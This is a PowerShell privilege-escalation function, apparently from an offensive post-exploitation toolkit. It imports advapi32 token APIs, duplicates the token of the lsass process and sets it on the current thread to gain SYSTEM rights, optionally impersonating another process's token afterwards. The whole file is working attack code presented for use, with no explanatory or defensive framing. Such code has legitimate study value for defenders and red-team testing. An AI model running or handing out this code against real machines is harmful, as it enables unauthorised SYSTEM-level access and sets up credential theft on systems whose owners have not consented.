#Impersonating your current token to the Id of the process your specified(default is System)
Function token-elevate($id=(Get-Process -Name lsass).Id)
{
    $elevate = @"
    public enum SECURITY_IMPERSONATION_LEVEL 
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    public enum TOKEN_TYPE 
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType,out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError=true)] 
    [return: MarshalAs(UnmanagedType.Bool)] 
    public static extern bool SetThreadToken(IntPtr PHThread,IntPtr Token);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle,UInt32 DesiredAccess, out IntPtr TokenHandle); 
"@

    
    Add-Type -MemberDefinition $elevate -Namespace "token" -Name "elevate"
    
    $TOKEN_IMPERSONATE = 4
    $TOKEN_DUPLICATE = 2
    $TOKEN_QUERY = 8

    #Open handle to the token of the process, duplicate it and set the current thread token to the one of the process.
    Function TokenImpersonate($id)
    {
        $process = Get-Process -Id $id
        $hToken = New-Object System.IntPtr
        $res = [token.elevate]::OpenProcessToken($process.Handle,$TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE,[ref]$hToken)
        if(!$res){Write-Host "[x] Failed to OpenToken For given process!!" -ForegroundColor Red}

        $DupToken = New-Object System.IntPtr
        $res = [token.elevate]::DuplicateTokenEx($hToken,$TOKEN_QUERY -bor $TOKEN_IMPERSONATE,[intptr]::Zero,[token.elevate+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation,[token.elevate+TOKEN_TYPE]::TokenImpersonation,[ref]$DupToken)
        if(!$res){Write-Host "[x] Failed to duplicate given token!!" -ForegroundColor Red}

        [token.elevate]::SetThreadToken([IntPtr]::Zero,$DupToken)
        if(!$res){Write-Host "[x] Failed to Set Token For given thread!!" -ForegroundColor Red}
        
    }

    $prid = (Get-Process -Name lsass).Id
    if($id -eq $prid){TokenImpersonate $prid}
    else{TokenImpersonate $prid ; TokenImpersonate $id}
}